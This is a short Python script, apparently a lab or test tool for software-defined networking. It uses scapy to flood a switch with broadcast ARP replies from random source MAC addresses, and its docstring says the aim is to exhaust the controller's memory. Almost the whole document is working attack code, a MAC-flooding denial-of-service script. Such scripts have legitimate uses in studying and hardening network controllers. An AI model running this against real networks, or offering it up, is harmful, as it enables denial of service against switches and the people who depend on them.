"""
Attempt to consume all memory in the controller by flooding
the switch with packets from different source MAC addresses.
Because the switch likely attempts to remember which MAC 
addresses are associated to which port, conducting this attack
can consume large amounts of memory. 

"""
from scapy.all import *
for x in range(100):
    dst_mac = 'ff:ff:ff:ff:ff:ff'
    src_mac = RandMAC()
    sendp(Ether(src=src_mac, dst=dst_mac)/ARP(op=2, psrc='0.0.0.0', hwdst='ff:ff:ff:ff:ff:ff')/Padding(load="X"*18))
